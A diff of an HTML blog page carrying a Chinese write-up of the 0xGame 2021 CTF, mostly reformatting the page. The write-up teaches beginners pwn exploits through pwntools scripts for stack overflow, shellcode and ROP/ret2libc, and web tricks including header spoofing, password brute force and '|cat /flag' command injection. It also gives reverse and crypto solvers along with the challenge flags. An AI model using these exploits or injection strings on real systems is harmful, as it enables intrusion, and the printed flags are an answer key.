@@ -5,10 +5,12 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="0xGame 2021 WriteUp, 十二惊惶">
-    <meta name="description" content="0xGame 2021 WriteUp[toc]
-PwnPwn？！附件给的其实有点多余，我给的目的是让大家知道pwn的最终目的就是执行system(“/bin/sh”)
-直接nc连接上之后cat flag打开flag文件即可
-ret2tex">
+    <meta name="description" content="0xGame 2021 WriteUp
+[toc]
+Pwn
+Pwn？！
+附件给的其实有点多余，我给的目的是让大家知道pwn的最终目的就是执行system(&amp;quot;/bin/sh&amp;quot;)
+直接nc连接上之后cat flag打开fla">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -417,7 +419,7 @@ ret2tex">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.9k
+                    5k
                 </div>
                 
 
@@ -447,10 +449,14 @@ ret2tex">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0xGame-2021-WriteUp"><a href="#0xGame-2021-WriteUp" class="headerlink" title="0xGame 2021 WriteUp"></a>0xGame 2021 WriteUp</h1><p>[toc]</p>
-<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Pwn？！"><a href="#Pwn？！" class="headerlink" title="Pwn？！"></a>Pwn？！</h3><p>附件给的其实有点多余，我给的目的是让大家知道pwn的最终目的就是执行system(“/bin/sh”)</p>
+                <h1>0xGame 2021 WriteUp</h1>
+<p>[toc]</p>
+<h2 id="pwn">Pwn</h2>
+<h3 id="pwn？">Pwn？！</h3>
+<p>附件给的其实有点多余，我给的目的是让大家知道pwn的最终目的就是执行system(&quot;/bin/sh&quot;)</p>
 <p>直接nc连接上之后cat flag打开flag文件即可</p>
-<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>我已经给了后门函数地址在0x40115b</p>
+<h3 id="ret2text">ret2text</h3>
+<p>我已经给了后门函数地址在0x40115b</p>
 <p>有一个明显的栈溢出</p>
 <p>ida里面显示距离rbp-0x50</p>
 <p>那么就直接覆盖0x50个字节填充以及0x8个字节覆盖rbp即可劫持到ret地址</p>
@@ -464,8 +470,8 @@ r<span class="token punctuation">.</span>recvline<span class="token punctuation"
 r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40115b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="WTF？Shellcode！"><a href="#WTF？Shellcode！" class="headerlink" title="WTF？Shellcode！"></a>WTF？Shellcode！</h3><p>这个题其实就是想让大家了解什么是shellcode</p>
+<h3 id="wtf？shellcode">WTF？Shellcode！</h3>
+<p>这个题其实就是想让大家了解什么是shellcode</p>
 <p>也就是直接执行机器码</p>
 <p>通过上网查找或者让pwntools自己生成的方法找到一段shellcode即可</p>
 <p>注意shellcode的编写需要熟练的汇编理解，而且日后会经常写一些复杂的shellcode</p>
@@ -482,16 +488,16 @@ gdb<span class="token punctuation">.</span>attach<span class="token punctuation"
 r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span>
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="No-BackDoor"><a href="#No-BackDoor" class="headerlink" title="No BackDoor!"></a>No BackDoor!</h3><p>这题需要了解linux下寄存器传递参数的顺序</p>
+<h3 id="no-backdoor">No BackDoor!</h3>
+<p>这题需要了解linux下寄存器传递参数的顺序</p>
 <p>rdi rsi rdx rcx r8 r9 栈</p>
 <p>既然存在system函数，而且查找存在/bin/sh字符串</p>
 <p>直接控制rdi位/bin/sh字符串地址，在调用system函数</p>
-<p>就相当于执行了system(“/bin/sh”)</p>
+<p>就相当于执行了system(&quot;/bin/sh&quot;)</p>
 <p>而控制rdi用的是pop rdi ; ret ;</p>
 <p>这样直接把字符串地址布置在栈上</p>
 <p>通过pop即控制了rdi参数</p>
-<p>(注意到这里有点小问题，就是直接执行会报错，详情可以参考<a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p>
+<p>(注意到这里有点小问题，就是直接执行会报错，详情可以参考http://blog.eonew.cn/archives/958</p>
 <p>需要ret一次来调整栈帧)(当然也可以直接当下一题做)</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>
@@ -505,8 +511,8 @@ r<span class="token punctuation">.</span>recvline<span class="token punctuation"
 r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="ret2libc-pro-max"><a href="#ret2libc-pro-max" class="headerlink" title="ret2libc pro max"></a>ret2libc pro max</h3><p>模板题，ctfwiki上讲的非常详细</p>
+<h3 id="ret2libc-pro-max">ret2libc pro max</h3>
+<p>模板题，ctfwiki上讲的非常详细</p>
 <p>建议遇上相似题目直接套模板</p>
 <p>libc版本为2.23-ubuntu11.2_amd64</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
@@ -534,12 +540,12 @@ r<span class="token punctuation">.</span>recvline<span class="token punctuation"
 r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Signin-User-Friendly"><a href="#Signin-User-Friendly" class="headerlink" title="Signin: User Friendly"></a>Signin: User Friendly</h3><p>IDA 打开软件 直接按 <code>f5</code> 或者 <code>shift</code> + <code>f12</code> 查看字符串，即可看到flag</p>
+<h2 id="reverse">Reverse</h2>
+<h3 id="signin-user-friendly">Signin: User Friendly</h3>
+<p>IDA 打开软件 直接按 <code>f5</code> 或者 <code>shift</code> + <code>f12</code> 查看字符串，即可看到flag</p>
 <p>有人可能会想知道，每次生成的随机数是多少。实际上我也不知道。因为每次程序运行使用的随机种子都不同，所以生成的随机数也不同。如果想知道生成的随机数是多少，可以自行动态调试获知，再输入程序获取flag</p>
-<h3 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h3><p><a target="_blank" rel="noopener" href="https://github.com/upx/upx" title="UPX链接">UPX github链接</a></p>
+<h3 id="packet">Packet</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/upx/upx" title="UPX链接">UPX github链接</a></p>
 <p>脱壳命令 <code>upx -d test.exe</code></p>
 <p>这里还需要知道一下 <code>(a&amp;~b | b&amp;~a) == a ^ b</code> 这两个运算相等</p>
 <p>解题脚本</p>
@@ -548,15 +554,15 @@ enc &#x3D; [145, 119, 251, 14, 183, 204, 228, 56, 17, 148, 253,133, 92, 145, 132
 for i in range(0,40):
     print(chr(arr[i] ^ enc[i]), end &#x3D; &quot;&quot;)
 # 0xGame&#123;f8b8a2c5dff64581be2a895c9ac216d1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Our-Compilation-Story"><a href="#Our-Compilation-Story" class="headerlink" title="Our Compilation Story"></a>Our Compilation Story</h3><p>简单 python 代码，读懂就可以做</p>
+<h3 id="our-compilation-story">Our Compilation Story</h3>
+<p>简单 python 代码，读懂就可以做</p>
 <pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [21,44,45,104,31,30,26,121,65,125,23,112,77,46,47,126,89,112,7,109,7,88,10,105,104,59,54,91,83,98,32,54,15,65,113,119,113]
 arr &#x3D; arr[::-1]
 for i in range(0,len(arr) - 3):
     print(chr(arr[i] ^ arr[i + 3]), end &#x3D; &quot;&quot;)
 # 0xGame&#123;Th3_10ng_w4y_w3_901ng_fr33&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Random-Chaos"><a href="#Random-Chaos" class="headerlink" title="Random Chaos"></a>Random Chaos</h3><p>C语言 <code>rand</code> 函数生成的随机数是伪随机数，本质是一个线性同余发生器，在随机种子给定的情况下每次生成的随机数序列相同，所以直接异或就可以</p>
+<h3 id="random-chaos">Random Chaos</h3>
+<p>C语言 <code>rand</code> 函数生成的随机数是伪随机数，本质是一个线性同余发生器，在随机种子给定的情况下每次生成的随机数序列相同，所以直接异或就可以</p>
 <pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;
 #include&lt;stdlib.h&gt;
 unsigned char enc[41] &#x3D; &#123;0x22, 0xca, 0x7, 0x19, 0xf8, 0xfb, 0x28, 0x9d, 0x1e, 0x80, 0xac, 0xc9, 0x60, 0x46, 0x18, 0x21, 0xdf, 0x95, 0xd5, 0x70, 0xc5, 0x19, 0xea, 0xb0, 0x9c, 0x83, 0x11, 0x4a, 0x93, 0xc7, 0x91, 0xf6, 0x14, 0x71, 0x2f, 0x22, 0x14, 0xbf, 0x58, 0x76&#125;; 
@@ -572,8 +578,8 @@ int main()
 &#125;
 &#x2F;&#x2F; 0xGame&#123;d6ca93397ecb4d4e83792a7100737932&#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Neverland"><a href="#Neverland" class="headerlink" title="Neverland"></a>Neverland</h3><p>递归深度比较小的时候，递归求解还能出结果</p>
+<h3 id="neverland">Neverland</h3>
+<p>递归深度比较小的时候，递归求解还能出结果</p>
 <p>当递归深度非常大时候，时间不够求解出结果，所以flag只能输出一半</p>
 <p>可以看一下文章按照优化斐波那契数列的方法优化一下func函数(<em>比如将递归转换为一个循环函数进行计算，虽然也慢，但与递归相比是非常的快了</em>)，就能输出正确结果</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41035588/article/details/81814547," title="斐波那契数列优化">【C语言】斐波那契数列四种优化求解</a></p>
@@ -589,7 +595,6 @@ int main()
 
 for i in range(1,50):
     print(i,&quot;:&quot;,func(i))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>输出结果如下</p>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">0 : 7
 1 : 8
@@ -623,12 +628,12 @@ for i in range(1,50):
 29 : 4294967292
 30 : 4
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>很容易就发现循环节了把，所以接下来就是直接异或操作就行，代码比较简单，这里就不写了</p>
 <p>甚至我们可以求出这个数列的通项公式，也很容易得到这个数列的每一个数据对应的值，下面给出一个知乎链接讲述形如斐波那契数列的数列如何求通项公式</p>
 <p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/25217301" title="斐波那契通项公式">斐波那契数列通项公式是怎样推导出来的？-知乎</a></p>
 <p>通项公式为 <code>a(n) = 3 * 4 ** n + 4 * (-1) ** n</code></p>
-<h3 id="Roundabout"><a href="#Roundabout" class="headerlink" title="Roundabout"></a>Roundabout</h3><p>脱壳后，简单的利用 key 来循环异或，代码如下</p>
+<h3 id="roundabout">Roundabout</h3>
+<p>脱壳后，简单的利用 key 来循环异或，代码如下</p>
 <pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [68, 16, 46, 18, 50, 12, 8, 61, 86, 10, 16, 103, 0, 65, 0, 1, 70, 90, 68, 66, 110, 12, 68, 114, 12, 13, 64, 62, 75, 95, 2, 1, 76, 94, 91, 23, 110, 12, 22, 104, 91, 18]
 h &#x3D; &quot;this_is_not_flag\x00&quot;
 flag &#x3D; &quot;&quot;
@@ -637,8 +642,8 @@ for i in range(0, 42):
 print(flag)
 # 0xGame&#123;b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Zero-Three"><a href="#Zero-Three" class="headerlink" title="Zero Three"></a>Zero Three</h3><p>z3 使用一下，就能解出flag</p>
+<h3 id="zero-three">Zero Three</h3>
+<p>z3 使用一下，就能解出flag</p>
 <pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from z3 import *
 import libnum
 p &#x3D; [Int(&#39;x%d&#39;%i) for i in range(0,32)]
@@ -685,14 +690,14 @@ if s.check() &#x3D;&#x3D; sat:
     print(flag)
 # 0xGame&#123;udydYCBxUB6vqsAt5VCs6LKDRqXLUhSW&#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="看看我的头"><a href="#看看我的头" class="headerlink" title="看看我的头"></a>看看我的头</h3><p>这个题主要是考察请求头的结构大概了解每部分都有什么作用。</p>
-<p>点进题目，先是打开方式不对，这很容易想到是请求方式不对，把GET请求方式改为POST，可以看到网页提示变化。再是提示要使用<code>N1k0la浏览器</code>。请求头中User-Agent向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。所以我们在这添加<code>N1k0la</code>。页面又发生变化，提示要本地登陆，所以我们添加X-Forwarded-For头去伪造我们的来源ip为本地ip：127.0.0.1 </p>
+<h2 id="web">Web</h2>
+<h3 id="看看我的头">看看我的头</h3>
+<p>这个题主要是考察请求头的结构大概了解每部分都有什么作用。</p>
+<p>点进题目，先是打开方式不对，这很容易想到是请求方式不对，把GET请求方式改为POST，可以看到网页提示变化。再是提示要使用<code>N1k0la浏览器</code>。请求头中User-Agent向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。所以我们在这添加<code>N1k0la</code>。页面又发生变化，提示要本地登陆，所以我们添加X-Forwarded-For头去伪造我们的来源ip为本地ip：127.0.0.1</p>
 <p>然后会得到一串base64编码的数据解码后是</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0xGame2021'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Pupi1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string single-quoted-string">'welcome to the
 0xGame2021'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>这里是一个php的弱类型，md5碰撞，有多种方式去做</p>
 <ol>
 <li>md5()返回32位字符串，若均为<strong>0e</strong>开头可被认为是科学计数法表示的数字<strong>0</strong></li>
@@ -700,26 +705,35 @@ if s.check() &#x3D;&#x3D; sat:
 <li>因为这里没有对是否传入变量进行判断，所以不传入md5处理的那2个变量，md5() 会直接输出<code>d41d8cd98f00b204e9800998ecf8427e</code> 代表空。</li>
 <li>当然也可以直接传入2个一样的值 :-)</li>
 </ol>
-<h3 id="看看你能登陆吗"><a href="#看看你能登陆吗" class="headerlink" title="看看你能登陆吗"></a>看看你能登陆吗</h3><p>这个题主要是为了让新生熟悉burpsuit的操作，了解web渗透的本质是信息搜集。</p>
+<h3 id="看看你能登陆吗">看看你能登陆吗</h3>
+<p>这个题主要是为了让新生熟悉burpsuit的操作，了解web渗透的本质是信息搜集。</p>
 <p>题目说了登陆的关键词，自然想到可能存在后台，直接试常见的后台路径，或者使用目录扫描器扫描后台路径。发现<code>/admin</code>存在访问发现后台。有提示说密码是4位纯数字，常识可知后台的用户名大部分为admin，所以我们爆破密码。这里可以使用burpsuit，或者python写脚本，只是这里密码故意设为0310（出题人的生日，嘻嘻  所以在爆破密码时要注意0开头的4个数字也是合理的。爆破登陆即可。</p>
-<h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>Robots协议了解一下。</p>
+<h3 id="robots">robots</h3>
+<p>Robots协议了解一下。</p>
 <p>robots.txt会被放在网站根目录下，告诉爬虫哪些不能爬，哪些能爬。 直接访问</p>
 <p><code>/robots.txt</code>得到提示4ll.html，之后直接访问<code>/4ll.html</code>F12查看网页源代码，即可得到。</p>
-<h3 id="爱ping才会赢"><a href="#爱ping才会赢" class="headerlink" title="爱ping才会赢"></a>爱ping才会赢</h3><p>这个题主要考察linux下的命令执行。</p>
-<p>首先发现带有Ping字样的按钮是不可点击的，F12后将对应处的disabled=”disabled”删除即可点中。</p>
+<h3 id="爱ping才会赢">爱ping才会赢</h3>
+<p>这个题主要考察linux下的命令执行。</p>
+<p>首先发现带有Ping字样的按钮是不可点击的，F12后将对应处的disabled=&quot;disabled&quot;删除即可点中。</p>
 <p>这里实现ping的功能猜测是使用了调用系统命令的函数，所以我们可以进行命令拼接。</p>
 <p>在linux中; |等<strong>连接符</strong>可连接两个独立语句并执行</p>
 <p><code>|ls /</code>所以我们传入这个就可以查看根目录下的文件，找到flag后直接传入<code>|cat /flag</code>即可</p>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-Sign-in"><a href="#Crypto-Sign-in" class="headerlink" title="Crypto Sign in"></a>Crypto Sign in</h3><p>下载附件，阅读一下入门指南，最后就有flag。</p>
-<h3 id="CuteCaesar"><a href="#CuteCaesar" class="headerlink" title="CuteCaesar"></a>CuteCaesar</h3><p>这题其实拿到附件，可以直接复制附件嗷呜嗷呜的内容去必应搜索，就能找到相关内容，可以知道需要兽语解码，当然第一天之后给了hint，大家也都很快找到了这个解码器。解码之后是</p>
+<h2 id="crypto">Crypto</h2>
+<h3 id="crypto-sign-in">Crypto Sign in</h3>
+<p>下载附件，阅读一下入门指南，最后就有flag。</p>
+<h3 id="cutecaesar">CuteCaesar</h3>
+<p>这题其实拿到附件，可以直接复制附件嗷呜嗷呜的内容去必应搜索，就能找到相关内容，可以知道需要兽语解码，当然第一天之后给了hint，大家也都很快找到了这个解码器。解码之后是</p>
 <pre class="line-numbers language-none"><code class="language-none">0aJdph&#123;fdhvdu_1v_q0w_fxwh&#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>这里根据题目名字，就可以知道是凯撒加密，百度找一个凯撒密码的解密器，位移量是3，解密即可。</p>
-<h3 id="manycode"><a href="#manycode" class="headerlink" title="manycode"></a>manycode</h3><p>这题套娃层数有点多，给大家添堵了，在这里道歉了。一开始的层数更多，后来想了想有些编码不是很常用，就去了两层，并且给了提示，搜索ctf常见编码，一个个比照就可以一层层解密。主要希望大家能掌握Base64、32、16这三种常见编码的形式。</p>
+<h3 id="manycode">manycode</h3>
+<p>这题套娃层数有点多，给大家添堵了，在这里道歉了。一开始的层数更多，后来想了想有些编码不是很常用，就去了两层，并且给了提示，搜索ctf常见编码，一个个比照就可以一层层解密。主要希望大家能掌握Base64、32、16这三种常见编码的形式。</p>
 <p>首先是aaencode，找一个在线解码器即可，网上说的在控制台运行会报错，可能是js的新语法规定 “_” 不能定义变量。然后就是三层base解码，依次是base16，base32，base64。最后就可以得到flag。</p>
-<h3 id="ezVigenere"><a href="#ezVigenere" class="headerlink" title="ezVigenère"></a>ezVigenère</h3><p>这题的做法很多，有的同学是写程序爆破key，有的同学是根据最后flag的格式0xGame，从而推断key为abc，当然也有同学找了一个网址，里面的key默认是abc，直接解密（大意了，忘改key了）。这里给大家推荐一个网站，网站是通过词频分析，破解维吉尼亚密码的，直接复制进去解密即可。<a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
-<h3 id="MyFunction"><a href="#MyFunction" class="headerlink" title="MyFunction"></a>MyFunction</h3><p>一个函数，这个函数是已知$y=x\ln x$,求$x$的结果。<br>这个题是模仿西电新生赛的函数题出的，那边用的是$y=e^x$，这个函数有反函数$y=\ln x$。但$y=x\ln x$没有反函数，但根据这个函数在$[1,+∞)$单调增，因此我们一个一个枚举它的值就行了。可能要考虑一下浮点误差(但实测并不需要)</p>
+<h3 id="ezvigenère">ezVigenère</h3>
+<p>这题的做法很多，有的同学是写程序爆破key，有的同学是根据最后flag的格式0xGame，从而推断key为abc，当然也有同学找了一个网址，里面的key默认是abc，直接解密（大意了，忘改key了）。这里给大家推荐一个网站，网站是通过词频分析，破解维吉尼亚密码的，直接复制进去解密即可。<a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
+<h3 id="myfunction">MyFunction</h3>
+<p>一个函数，这个函数是已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>x</mi><mi>ln</mi><mo>⁡</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">y=x\ln x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span></span></span></span>,求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>的结果。<br>
+这个题是模仿西电新生赛的函数题出的，那边用的是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>e</mi><mi>x</mi></msup></mrow><annotation encoding="application/x-tex">y=e^x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span>，这个函数有反函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>ln</mi><mo>⁡</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">y=\ln x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span></span></span></span>。但<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>x</mi><mi>ln</mi><mo>⁡</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">y=x\ln x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span></span></span></span>没有反函数，但根据这个函数在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mo>+</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[1,+∞)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">+</span><span class="mord">∞</span><span class="mclose">)</span></span></span></span>单调增，因此我们一个一个枚举它的值就行了。可能要考虑一下浮点误差(但实测并不需要)</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> math <span class="token keyword">import</span> log
 s<span class="token operator">=</span><span class="token string">""</span>
@@ -732,9 +746,9 @@ D<span class="token operator">=</span><span class="token builtin">open</span><sp
 <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
 <span class="token comment">#0xGame&#123;YouH4veKn0wedPy7honL081s&lt;y=ln(x)>InM47hs&#125;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>不过多数人是Excel打表、或者一个一个算的。直接开脚本写的不多。</p>
